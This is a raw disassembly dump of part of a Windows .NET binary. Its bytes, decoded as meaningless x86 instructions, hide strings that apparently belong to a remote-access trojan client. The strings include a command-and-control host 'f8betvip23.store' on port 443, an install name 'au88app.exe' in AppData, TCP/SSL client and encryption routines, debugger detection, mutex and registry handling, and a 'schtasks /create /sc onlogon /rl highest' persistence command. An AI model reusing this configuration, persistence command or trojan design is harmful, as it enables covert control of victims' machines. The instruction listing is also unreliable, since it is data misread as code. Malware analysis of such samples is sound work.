  406efb:	70 70                	jo     0x406f6d
  406efd:	65 72 49             	gs jb  0x406f49
  406f00:	6e                   	outsb  %ds:(%esi),(%dx)
  406f01:	76 61                	jbe    0x406f64
  406f03:	72 69                	jb     0x406f6e
  406f05:	61                   	popa
  406f06:	6e                   	outsb  %ds:(%esi),(%dx)
  406f07:	74 00                	je     0x406f09
  406f09:	57                   	push   %edi
  406f0a:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  406f0e:	69 65 6e 74 00 49 6e 	imul   $0x6e490074,0x6e(%ebp),%esp
  406f15:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  406f1c:	65 
  406f1d:	43                   	inc    %ebx
  406f1e:	6c                   	insb   (%dx),%es:(%edi)
  406f1f:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  406f26:	74 5f                	je     0x406f87
  406f28:	53                   	push   %ebx
  406f29:	73 6c                	jae    0x406f97
  406f2b:	43                   	inc    %ebx
  406f2c:	6c                   	insb   (%dx),%es:(%edi)
  406f2d:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  406f34:	74 5f                	je     0x406f95
  406f36:	53                   	push   %ebx
  406f37:	73 6c                	jae    0x406fa5
  406f39:	43                   	inc    %ebx
  406f3a:	6c                   	insb   (%dx),%es:(%edi)
  406f3b:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  406f42:	74 5f                	je     0x406fa3
  406f44:	54                   	push   %esp
  406f45:	63 70 43             	arpl   %esi,0x43(%eax)
  406f48:	6c                   	insb   (%dx),%es:(%edi)
  406f49:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  406f50:	74 5f                	je     0x406fb1
  406f52:	54                   	push   %esp
  406f53:	63 70 43             	arpl   %esi,0x43(%eax)
  406f56:	6c                   	insb   (%dx),%es:(%edi)
  406f57:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  406f5e:	74 68                	je     0x406fc8
  406f60:	65 6e                	outsb  %gs:(%esi),(%dx)
  406f62:	74 69                	je     0x406fcd
  406f64:	63 61 74             	arpl   %esp,0x74(%ecx)
  406f67:	65 41                	gs inc %ecx
  406f69:	73 43                	jae    0x406fae
  406f6b:	6c                   	insb   (%dx),%es:(%edi)
  406f6c:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  406f73:	73 74                	jae    0x406fe9
  406f75:	65 6d                	gs insl (%dx),%es:(%edi)
  406f77:	2e 4d                	cs dec %ebp
  406f79:	61                   	popa
  406f7a:	6e                   	outsb  %ds:(%esi),(%dx)
  406f7b:	61                   	popa
  406f7c:	67 65 6d             	gs insl (%dx),%es:(%di)
  406f7f:	65 6e                	outsb  %gs:(%esi),(%dx)
  406f81:	74 00                	je     0x406f83
  406f83:	45                   	inc    %ebp
  406f84:	6e                   	outsb  %ds:(%esi),(%dx)
  406f85:	76 69                	jbe    0x406ff0
  406f87:	72 6f                	jb     0x406ff8
  406f89:	6e                   	outsb  %ds:(%esi),(%dx)
  406f8a:	6d                   	insl   (%dx),%es:(%edi)
  406f8b:	65 6e                	outsb  %gs:(%esi),(%dx)
  406f8d:	74 00                	je     0x406f8f
  406f8f:	67 65 74 5f          	addr16 gs je 0x406ff2
  406f93:	43                   	inc    %ebx
  406f94:	75 72                	jne    0x407008
  406f96:	72 65                	jb     0x406ffd
  406f98:	6e                   	outsb  %ds:(%esi),(%dx)
  406f99:	74 00                	je     0x406f9b
  406f9b:	47                   	inc    %edi
  406f9c:	65 74 43             	gs je  0x406fe2
  406f9f:	75 72                	jne    0x407013
  406fa1:	72 65                	jb     0x407008
  406fa3:	6e                   	outsb  %ds:(%esi),(%dx)
  406fa4:	74 00                	je     0x406fa6
  406fa6:	43                   	inc    %ebx
  406fa7:	68 65 63 6b 52       	push   $0x526b6365
  406fac:	65 6d                	gs insl (%dx),%es:(%edi)
  406fae:	6f                   	outsl  %ds:(%esi),(%dx)
  406faf:	74 65                	je     0x407016
  406fb1:	44                   	inc    %esp
  406fb2:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  406fb6:	67 65 72 50          	addr16 gs jb 0x40700a
  406fba:	72 65                	jb     0x407021
  406fbc:	73 65                	jae    0x407023
  406fbe:	6e                   	outsb  %ds:(%esi),(%dx)
  406fbf:	74 00                	je     0x406fc1
  406fc1:	69 73 44 65 62 75 67 	imul   $0x67756265,0x44(%ebx),%esi
  406fc8:	67 65 72 50          	addr16 gs jb 0x40701c
  406fcc:	72 65                	jb     0x407033
  406fce:	73 65                	jae    0x407035
  406fd0:	6e                   	outsb  %ds:(%esi),(%dx)
  406fd1:	74 00                	je     0x406fd3
  406fd3:	67 65 74 5f          	addr16 gs je 0x407036
  406fd7:	52                   	push   %edx
  406fd8:	65 6d                	gs insl (%dx),%es:(%edi)
  406fda:	6f                   	outsl  %ds:(%esi),(%dx)
  406fdb:	74 65                	je     0x407042
  406fdd:	45                   	inc    %ebp
  406fde:	6e                   	outsb  %ds:(%esi),(%dx)
  406fdf:	64 50                	fs push %eax
  406fe1:	6f                   	outsl  %ds:(%esi),(%dx)
  406fe2:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  406fe9:	5f                   	pop    %edi
  406fea:	43                   	inc    %ebx
  406feb:	6f                   	outsl  %ds:(%esi),(%dx)
  406fec:	75 6e                	jne    0x40705c
  406fee:	74 00                	je     0x406ff0
  406ff0:	67 65 74 5f          	addr16 gs je 0x407053
  406ff4:	50                   	push   %eax
  406ff5:	72 6f                	jb     0x407066
  406ff7:	63 65 73             	arpl   %esp,0x73(%ebp)
  406ffa:	73 6f                	jae    0x40706b
  406ffc:	72 43                	jb     0x407041
  406ffe:	6f                   	outsl  %ds:(%esi),(%dx)
  406fff:	75 6e                	jne    0x40706f
  407001:	74 00                	je     0x407003
  407003:	63 6f 75             	arpl   %ebp,0x75(%edi)
  407006:	6e                   	outsb  %ds:(%esi),(%dx)
  407007:	74 00                	je     0x407009
  407009:	47                   	inc    %edi
  40700a:	65 74 50             	gs je  0x40705d
  40700d:	61                   	popa
  40700e:	74 68                	je     0x407078
  407010:	52                   	push   %edx
  407011:	6f                   	outsl  %ds:(%esi),(%dx)
  407012:	6f                   	outsl  %ds:(%esi),(%dx)
  407013:	74 00                	je     0x407015
  407015:	44                   	inc    %esp
  407016:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  40701a:	70 74                	jo     0x407090
  40701c:	00 45 6e             	add    %al,0x6e(%ebp)
  40701f:	63 72 79             	arpl   %esi,0x79(%edx)
  407022:	70 74                	jo     0x407098
  407024:	00 50 61             	add    %dl,0x61(%eax)
  407027:	72 61                	jb     0x40708a
  407029:	6d                   	insl   (%dx),%es:(%edi)
  40702a:	65 74 65             	gs je  0x407092
  40702d:	72 69                	jb     0x407098
  40702f:	7a 65                	jp     0x407096
  407031:	64 54                	fs push %esp
  407033:	68 72 65 61 64       	push   $0x64616572
  407038:	53                   	push   %ebx
  407039:	74 61                	je     0x40709c
  40703b:	72 74                	jb     0x4070b1
  40703d:	00 43 6f             	add    %al,0x6f(%ebx)
  407040:	6e                   	outsb  %ds:(%esi),(%dx)
  407041:	76 65                	jbe    0x4070a8
  407043:	72 74                	jb     0x4070b9
  407045:	00 46 61             	add    %al,0x61(%esi)
  407048:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  40704f:	54 
  407050:	6f                   	outsl  %ds:(%esi),(%dx)
  407051:	4c                   	dec    %esp
  407052:	69 73 74 00 69 6e 70 	imul   $0x706e6900,0x74(%ebx),%esi
  407059:	75 74                	jne    0x4070cf
  40705b:	00 4d 6f             	add    %cl,0x6f(%ebp)
  40705e:	76 65                	jbe    0x4070c5
  407060:	4e                   	dec    %esi
  407061:	65 78 74             	gs js  0x4070d8
  407064:	00 53 79             	add    %dl,0x79(%ebx)
  407067:	73 74                	jae    0x4070dd
  407069:	65 6d                	gs insl (%dx),%es:(%edi)
  40706b:	2e 54                	cs push %esp
  40706d:	65 78 74             	gs js  0x4070e4
  407070:	00 47 65             	add    %al,0x65(%edi)
  407073:	74 57                	je     0x4070cc
  407075:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  40707c:	78 74                	js     0x4070f2
  40707e:	00 74 65 78          	add    %dh,0x78(%ebp,%eiz,2)
  407082:	74 00                	je     0x407084
  407084:	47                   	inc    %edi
  407085:	65 74 46             	gs je  0x4070ce
  407088:	6f                   	outsl  %ds:(%esi),(%dx)
  407089:	72 65                	jb     0x4070f0
  40708b:	67 72 6f             	addr16 jb 0x4070fd
  40708e:	75 6e                	jne    0x4070fe
  407090:	64 57                	fs push %edi
  407092:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  407099:	65 74 5f             	gs je  0x4070fb
  40709c:	43                   	inc    %ebx
  40709d:	72 65                	jb     0x407104
  40709f:	61                   	popa
  4070a0:	74 65                	je     0x407107
  4070a2:	4e                   	dec    %esi
  4070a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4070a4:	57                   	push   %edi
  4070a5:	69 6e 64 6f 77 00 43 	imul   $0x4300776f,0x64(%esi),%ebp
  4070ac:	6c                   	insb   (%dx),%es:(%edi)
  4070ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4070ae:	73 65                	jae    0x407115
  4070b0:	4d                   	dec    %ebp
  4070b1:	75 74                	jne    0x407127
  4070b3:	65 78 00             	gs js  0x4070b6
  4070b6:	43                   	inc    %ebx
  4070b7:	72 65                	jb     0x40711e
  4070b9:	61                   	popa
  4070ba:	74 65                	je     0x407121
  4070bc:	4d                   	dec    %ebp
  4070bd:	75 74                	jne    0x407133
  4070bf:	65 78 00             	gs js  0x4070c2
  4070c2:	44                   	inc    %esp
  4070c3:	65 6c                	gs insb (%dx),%es:(%edi)
  4070c5:	61                   	popa
  4070c6:	79 00                	jns    0x4070c8
  4070c8:	49                   	dec    %ecx
  4070c9:	6e                   	outsb  %ds:(%esi),(%dx)
  4070ca:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  4070d1:	65 
  4070d2:	41                   	inc    %ecx
  4070d3:	72 72                	jb     0x407147
  4070d5:	61                   	popa
  4070d6:	79 00                	jns    0x4070d8
  4070d8:	54                   	push   %esp
  4070d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4070da:	41                   	inc    %ecx
  4070db:	72 72                	jb     0x40714f
  4070dd:	61                   	popa
  4070de:	79 00                	jns    0x4070e0
  4070e0:	67 65 74 5f          	addr16 gs je 0x407143
  4070e4:	4b                   	dec    %ebx
  4070e5:	65 79 00             	gs jns 0x4070e8
  4070e8:	73 65                	jae    0x40714f
  4070ea:	74 5f                	je     0x40714b
  4070ec:	4b                   	dec    %ebx
  4070ed:	65 79 00             	gs jns 0x4070f0
  4070f0:	43                   	inc    %ebx
  4070f1:	72 65                	jb     0x407158
  4070f3:	61                   	popa
  4070f4:	74 65                	je     0x40715b
  4070f6:	53                   	push   %ebx
  4070f7:	75 62                	jne    0x40715b
  4070f9:	4b                   	dec    %ebx
  4070fa:	65 79 00             	gs jns 0x4070fd
  4070fd:	44                   	inc    %esp
  4070fe:	65 6c                	gs insb (%dx),%es:(%edi)
  407100:	65 74 65             	gs je  0x407168
  407103:	53                   	push   %ebx
  407104:	75 62                	jne    0x407168
  407106:	4b                   	dec    %ebx
  407107:	65 79 00             	gs jns 0x40710a
  40710a:	4f                   	dec    %edi
  40710b:	70 65                	jo     0x407172
  40710d:	6e                   	outsb  %ds:(%esi),(%dx)
  40710e:	53                   	push   %ebx
  40710f:	75 62                	jne    0x407173
  407111:	4b                   	dec    %ebx
  407112:	65 79 00             	gs jns 0x407115
  407115:	67 65 74 5f          	addr16 gs je 0x407178
  407119:	50                   	push   %eax
  40711a:	75 62                	jne    0x40717e
  40711c:	6c                   	insb   (%dx),%es:(%edi)
  40711d:	69 63 4b 65 79 00 5f 	imul   $0x5f007965,0x4b(%ebx),%esp
  407124:	61                   	popa
  407125:	75 74                	jne    0x40719b
  407127:	68 4b 65 79 00       	push   $0x79654b
  40712c:	6d                   	insl   (%dx),%es:(%edi)
  40712d:	61                   	popa
  40712e:	73 74                	jae    0x4071a4
  407130:	65 72 4b             	gs jb  0x40717e
  407133:	65 79 00             	gs jns 0x407136
  407136:	52                   	push   %edx
  407137:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  40713e:	4b 65 
  407140:	79 00                	jns    0x407142
  407142:	5f                   	pop    %edi
  407143:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  407147:	53                   	push   %ebx
  407148:	79 73                	jns    0x4071bd
  40714a:	74 65                	je     0x4071b1
  40714c:	6d                   	insl   (%dx),%es:(%edi)
  40714d:	2e 53                	cs push %ebx
  40714f:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  407153:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  40715a:	70 
  40715b:	74 6f                	je     0x4071cc
  40715d:	67 72 61             	addr16 jb 0x4071c1
  407160:	70 68                	jo     0x4071ca
  407162:	79 00                	jns    0x407164
  407164:	41                   	inc    %ecx
  407165:	73 73                	jae    0x4071da
  407167:	65 6d                	gs insl (%dx),%es:(%edi)
  407169:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  40716d:	41                   	inc    %ecx
  40716e:	64 64 72 65          	fs fs jb 0x4071d7
  407172:	73 73                	jae    0x4071e7
  407174:	46                   	inc    %esi
  407175:	61                   	popa
  407176:	6d                   	insl   (%dx),%es:(%edi)
  407177:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  40717e:	63 
  40717f:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  407183:	79 00                	jns    0x407185
  407185:	67 65 74 5f          	addr16 gs je 0x4071e8
  407189:	53                   	push   %ebx
  40718a:	79 73                	jns    0x4071ff
  40718c:	74 65                	je     0x4071f3
  40718e:	6d                   	insl   (%dx),%es:(%edi)
  40718f:	44                   	inc    %esp
  407190:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  407197:	79 00                	jns    0x407199
  407199:	53                   	push   %ebx
  40719a:	65 74 52             	gs je  0x4071ef
  40719d:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  4071a4:	00 6f 
  4071a6:	70 5f                	jo     0x407207
  4071a8:	45                   	inc    %ebp
  4071a9:	71 75                	jno    0x407220
  4071ab:	61                   	popa
  4071ac:	6c                   	insb   (%dx),%es:(%edi)
  4071ad:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  4071b4:	49 
  4071b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4071b6:	65 71 75             	gs jno 0x40722e
  4071b9:	61                   	popa
  4071ba:	6c                   	insb   (%dx),%es:(%edi)
  4071bb:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  4071c2:	74 
  4071c3:	65 6d                	gs insl (%dx),%es:(%edi)
  4071c5:	2e 4e                	cs dec %esi
  4071c7:	65 74 2e             	gs je  0x4071f8
  4071ca:	53                   	push   %ebx
  4071cb:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4071cf:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  4071d6:	64 
  4071d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4071d8:	77 73                	ja     0x40724d
  4071da:	49                   	dec    %ecx
  4071db:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4071de:	74 69                	je     0x407249
  4071e0:	74 79                	je     0x40725b
  4071e2:	00 49 73             	add    %cl,0x73(%ecx)
  4071e5:	4e                   	dec    %esi
  4071e6:	75 6c                	jne    0x407254
  4071e8:	6c                   	insb   (%dx),%es:(%edi)
  4071e9:	4f                   	dec    %edi
  4071ea:	72 45                	jb     0x407231
  4071ec:	6d                   	insl   (%dx),%es:(%edi)
  4071ed:	70 74                	jo     0x407263
  4071ef:	79 00                	jns    0x4071f1
  4071f1:	00 00                	add    %al,(%eax)
  4071f3:	00 00                	add    %al,(%eax)
  4071f5:	0d 53 00 48 00       	or     $0x480053,%eax
  4071fa:	41                   	inc    %ecx
  4071fb:	00 32                	add    %dh,(%edx)
  4071fd:	00 35 00 36 00 00    	add    %dh,0x3600
  407203:	07                   	pop    %es
  407204:	34 00                	xor    $0x0,%al
  407206:	34 00                	xor    $0x0,%al
  407208:	33 00                	xor    (%eax),%eax
  40720a:	00 21                	add    %ah,(%ecx)
  40720c:	66 00 38             	data16 add %bh,(%eax)
  40720f:	00 62 00             	add    %ah,0x0(%edx)
  407212:	65 00 74 00 76       	add    %dh,%gs:0x76(%eax,%eax,1)
  407217:	00 69 00             	add    %ch,0x0(%ecx)
  40721a:	70 00                	jo     0x40721c
  40721c:	32 00                	xor    (%eax),%al
  40721e:	33 00                	xor    (%eax),%eax
  407220:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  407224:	74 00                	je     0x407226
  407226:	6f                   	outsl  %ds:(%esi),(%dx)
  407227:	00 72 00             	add    %dh,0x0(%edx)
  40722a:	65 00 00             	add    %al,%gs:(%eax)
  40722d:	0d 30 00 2e 00       	or     $0x2e0030,%eax
  407232:	35 00 2e 00 37       	xor    $0x37002e00,%eax
  407237:	00 42 00             	add    %al,0x0(%edx)
  40723a:	00 0b                	add    %cl,(%ebx)
  40723c:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  407240:	6c                   	insb   (%dx),%es:(%edi)
  407241:	00 73 00             	add    %dh,0x0(%ebx)
  407244:	65 00 00             	add    %al,%gs:(%eax)
  407247:	0f 41 00             	cmovno (%eax),%eax
  40724a:	70 00                	jo     0x40724c
  40724c:	70 00                	jo     0x40724e
  40724e:	44                   	inc    %esp
  40724f:	00 61 00             	add    %ah,0x0(%ecx)
  407252:	74 00                	je     0x407254
  407254:	61                   	popa
  407255:	00 00                	add    %al,(%eax)
  407257:	17                   	pop    %ss
  407258:	61                   	popa
  407259:	00 75 00             	add    %dh,0x0(%ebp)
  40725c:	38 00                	cmp    %al,(%eax)
  40725e:	38 00                	cmp    %al,(%eax)
  407260:	61                   	popa
  407261:	00 70 00             	add    %dh,0x0(%eax)
  407264:	70 00                	jo     0x407266
  407266:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40726a:	78 00                	js     0x40726c
  40726c:	65 00 00             	add    %al,%gs:(%eax)
  40726f:	59                   	pop    %ecx
  407270:	55                   	push   %ebp
  407271:	00 32                	add    %dh,(%edx)
  407273:	00 56 00             	add    %dl,0x0(%esi)
  407276:	6a 00                	push   $0x0
  407278:	64 00 58 00          	add    %bl,%fs:0x0(%eax)
  40727c:	4a                   	dec    %edx
  40727d:	00 6c 00 55          	add    %ch,0x55(%eax,%eax,1)
  407281:	00 6d 00             	add    %ch,0x0(%ebp)
  407284:	46                   	inc    %esi
  407285:	00 75 00             	add    %dh,0x0(%ebp)
  407288:	5a                   	pop    %edx
  407289:	00 47 00             	add    %al,0x0(%edi)
  40728c:	39 00                	cmp    %eax,(%eax)
  40728e:	74 00                	je     0x407290
  407290:	53                   	push   %ebx
  407291:	00 32                	add    %dh,(%edx)
  407293:	00 56 00             	add    %dl,0x0(%esi)
  407296:	35 00 52 00 6d       	xor    $0x6d005200,%eax
  40729b:	00 39                	add    %bh,(%ecx)
  40729d:	00 79 00             	add    %bh,0x0(%ecx)
  4072a0:	55                   	push   %ebp
  4072a1:	00 6d 00             	add    %ch,0x0(%ebp)
  4072a4:	46                   	inc    %esi
  4072a5:	00 30                	add    %dh,(%eax)
  4072a7:	00 4d 00             	add    %cl,0x0(%ebp)
  4072aa:	6a 00                	push   $0x0
  4072ac:	41                   	inc    %ecx
  4072ad:	00 79 00             	add    %bh,0x0(%ecx)
  4072b0:	4e                   	dec    %esi
  4072b1:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  4072b5:	00 79 00             	add    %bh,0x0(%ecx)
  4072b8:	62 00                	bound  %eax,(%eax)
  4072ba:	32 00                	xor    (%eax),%al
  4072bc:	70 00                	jo     0x4072be
  4072be:	6c                   	insb   (%dx),%es:(%edi)
  4072bf:	00 59 00             	add    %bl,0x0(%ecx)
  4072c2:	33 00                	xor    (%eax),%eax
  4072c4:	51                   	push   %ecx
  4072c5:	00 3d 00 00 0b 25    	add    %bh,0x250b0000
  4072cb:	00 4d 00             	add    %cl,0x0(%ebp)
  4072ce:	54                   	push   %esp
  4072cf:	00 58 00             	add    %bl,0x0(%eax)
  4072d2:	25 00 00 1b 25       	and    $0x251b0000,%eax
  4072d7:	00 43 00             	add    %al,0x0(%ebx)
  4072da:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4072de:	74 00                	je     0x4072e0
  4072e0:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
  4072e6:	63 00                	arpl   %eax,(%eax)
  4072e8:	61                   	popa
  4072e9:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4072ed:	00 25 00 00 23 25    	add    %ah,0x25230000
  4072f3:	00 53 00             	add    %dl,0x0(%ebx)
  4072f6:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4072fa:	76 00                	jbe    0x4072fc
  4072fc:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407300:	73 00                	jae    0x407302
  407302:	69 00 67 00 6e 00    	imul   $0x6e0067,(%eax),%eax
  407308:	61                   	popa
  407309:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  40730d:	00 72 00             	add    %dh,0x0(%edx)
  407310:	65 00 25 00 00 09 6e 	add    %ah,%gs:0x6e090000
  407317:	00 75 00             	add    %dh,0x0(%ebp)
  40731a:	6c                   	insb   (%dx),%es:(%edi)
  40731b:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40731f:	03 30                	add    (%eax),%esi
  407321:	00 00                	add    %al,(%eax)
  407323:	0b 44 00 65          	or     0x65(%eax,%eax,1),%eax
  407327:	00 62 00             	add    %ah,0x0(%edx)
  40732a:	75 00                	jne    0x40732c
  40732c:	67 00 00             	add    %al,(%bx,%si)
  40732f:	01 00                	add    %eax,(%eax)
  407331:	03 3a                	add    (%edx),%edi
  407333:	00 00                	add    %al,(%eax)
  407335:	15 43 00 6f 00       	adc    $0x6f0043,%eax
  40733a:	6e                   	outsb  %ds:(%esi),(%dx)
  40733b:	00 6e 00             	add    %ch,0x0(%esi)
  40733e:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  407342:	74 00                	je     0x407344
  407344:	65 00 64 00 21       	add    %ah,%gs:0x21(%eax,%eax,1)
  407349:	00 00                	add    %al,(%eax)
  40734b:	1b 44 00 69          	sbb    0x69(%eax,%eax,1),%eax
  40734f:	00 73 00             	add    %dh,0x0(%ebx)
  407352:	63 00                	arpl   %eax,(%eax)
  407354:	6f                   	outsl  %ds:(%esi),(%dx)
  407355:	00 6e 00             	add    %ch,0x0(%esi)
  407358:	6e                   	outsb  %ds:(%esi),(%dx)
  407359:	00 65 00             	add    %ah,0x0(%ebp)
  40735c:	63 00                	arpl   %eax,(%eax)
  40735e:	74 00                	je     0x407360
  407360:	65 00 64 00 21       	add    %ah,%gs:0x21(%eax,%eax,1)
  407365:	00 00                	add    %al,(%eax)
  407367:	2d 2f 00 2f 00       	sub    $0x2f002f,%eax
  40736c:	2f                   	das
  40736d:	00 20                	add    %ah,(%eax)
  40736f:	00 43 00             	add    %al,0x0(%ebx)
  407372:	6c                   	insb   (%dx),%es:(%edi)
  407373:	00 69 00             	add    %ch,0x0(%ecx)
  407376:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40737a:	74 00                	je     0x40737c
  40737c:	20 00                	and    %al,(%eax)
  40737e:	42                   	inc    %edx
  40737f:	00 75 00             	add    %dh,0x0(%ebp)
  407382:	66 00 66 00          	data16 add %ah,0x0(%esi)
  407386:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40738a:	73 00                	jae    0x40738c
  40738c:	69 00 7a 00 65 00    	imul   $0x65007a,(%eax),%eax
  407392:	20 00                	and    %al,(%eax)
  407394:	00 17                	add    %dl,(%edi)
  407396:	20 00                	and    %al,(%eax)
  407398:	42                   	inc    %edx
  407399:	00 79 00             	add    %bh,0x0(%ecx)
  40739c:	74 00                	je     0x40739e
  40739e:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4073a2:	20 00                	and    %al,(%eax)
  4073a4:	20 00                	and    %al,(%eax)
  4073a6:	2f                   	das
  4073a7:	00 2f                	add    %ch,(%edi)
  4073a9:	00 2f                	add    %ch,(%edi)
  4073ab:	00 00                	add    %al,(%eax)
  4073ad:	17                   	pop    %ss
  4073ae:	73 00                	jae    0x4073b0
  4073b0:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4073b4:	64 00 20             	add    %ah,%fs:(%eax)
  4073b7:	00 63 00             	add    %ah,0x0(%ebx)
  4073ba:	68 00 75 00 6e       	push   $0x6e007500
  4073bf:	00 6b 00             	add    %ch,0x0(%ebx)
  4073c2:	73 00                	jae    0x4073c4
  4073c4:	00 0d 50 00 61 00    	add    %cl,0x610050
  4073ca:	63 00                	arpl   %eax,(%eax)
  4073cc:	6b 00 65             	imul   $0x65,(%eax),%eax
  4073cf:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  4073d3:	09 50 00             	or     %edx,0x0(%eax)
  4073d6:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  4073dc:	00 0f                	add    %cl,(%edi)
  4073de:	4d                   	dec    %ebp
  4073df:	00 65 00             	add    %ah,0x0(%ebp)
  4073e2:	73 00                	jae    0x4073e4
  4073e4:	73 00                	jae    0x4073e6
  4073e6:	61                   	popa
  4073e7:	00 67 00             	add    %ah,0x0(%edi)
  4073ea:	65 00 00             	add    %al,%gs:(%eax)
  4073ed:	1b 52 00             	sbb    0x0(%edx),%edx
  4073f0:	61                   	popa
  4073f1:	00 6e 00             	add    %ch,0x0(%esi)
  4073f4:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  4073f8:	6d                   	insl   (%dx),%es:(%edi)
  4073f9:	00 50 00             	add    %dl,0x0(%eax)
  4073fc:	61                   	popa
  4073fd:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  407401:	00 69 00             	add    %ch,0x0(%ecx)
  407404:	6e                   	outsb  %ds:(%esi),(%dx)
  407405:	00 67 00             	add    %ah,0x0(%edi)
  407408:	00 07                	add    %al,(%edi)
  40740a:	63 00                	arpl   %eax,(%eax)
  40740c:	6d                   	insl   (%dx),%es:(%edi)
  40740d:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  407411:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  407417:	00 73 00             	add    %dh,0x0(%ebx)
  40741a:	63 00                	arpl   %eax,(%eax)
  40741c:	68 00 74 00 61       	push   $0x61007400
  407421:	00 73 00             	add    %dh,0x0(%ebx)
  407424:	6b 00 73             	imul   $0x73,(%eax),%eax
  407427:	00 20                	add    %ah,(%eax)
  407429:	00 2f                	add    %ch,(%edi)
  40742b:	00 63 00             	add    %ah,0x0(%ebx)
  40742e:	72 00                	jb     0x407430
  407430:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  407434:	74 00                	je     0x407436
  407436:	65 00 20             	add    %ah,%gs:(%eax)
  407439:	00 2f                	add    %ch,(%edi)
  40743b:	00 66 00             	add    %ah,0x0(%esi)
  40743e:	20 00                	and    %al,(%eax)
  407440:	2f                   	das
  407441:	00 73 00             	add    %dh,0x0(%ebx)
  407444:	63 00                	arpl   %eax,(%eax)
  407446:	20 00                	and    %al,(%eax)
  407448:	6f                   	outsl  %ds:(%esi),(%dx)
  407449:	00 6e 00             	add    %ch,0x0(%esi)
  40744c:	6c                   	insb   (%dx),%es:(%edi)
  40744d:	00 6f 00             	add    %ch,0x0(%edi)
  407450:	67 00 6f 00          	add    %ch,0x0(%bx)
  407454:	6e                   	outsb  %ds:(%esi),(%dx)
  407455:	00 20                	add    %ah,(%eax)
  407457:	00 2f                	add    %ch,(%edi)
  407459:	00 72 00             	add    %dh,0x0(%edx)
  40745c:	6c                   	insb   (%dx),%es:(%edi)
  40745d:	00 20                	add    %ah,(%eax)
  40745f:	00 68 00             	add    %ch,0x0(%eax)
  407462:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  407468:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40746c:	74 00                	je     0x40746e
  40746e:	20 00                	and    %al,(%eax)
  407470:	2f                   	das
  407471:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  407475:	00 20                	add    %ah,(%eax)
  407477:	00 22                	add    %ah,(%edx)
  407479:	00 00                	add    %al,(%eax)
  40747b:	11 22                	adc    %esp,(%edx)
  40747d:	00 20                	add    %ah,(%eax)
  40747f:	00 2f                	add    %ch,(%edi)
  407481:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  407485:	00 20                	add    %ah,(%eax)
  407487:	00 27                	add    %ah,(%edi)
  407489:	00 22                	add    %ah,(%edx)
  40748b:	00 01                	add    %al,(%ecx)
  40748d:	13 22                	adc    (%edx),%esp
  40748f:	00 27                	add    %ah,(%edi)
  407491:	00 20                	add    %ah,(%eax)
  407493:	00 26                	add    %ah,(%esi)
  407495:	00 20                	add    %ah,(%eax)
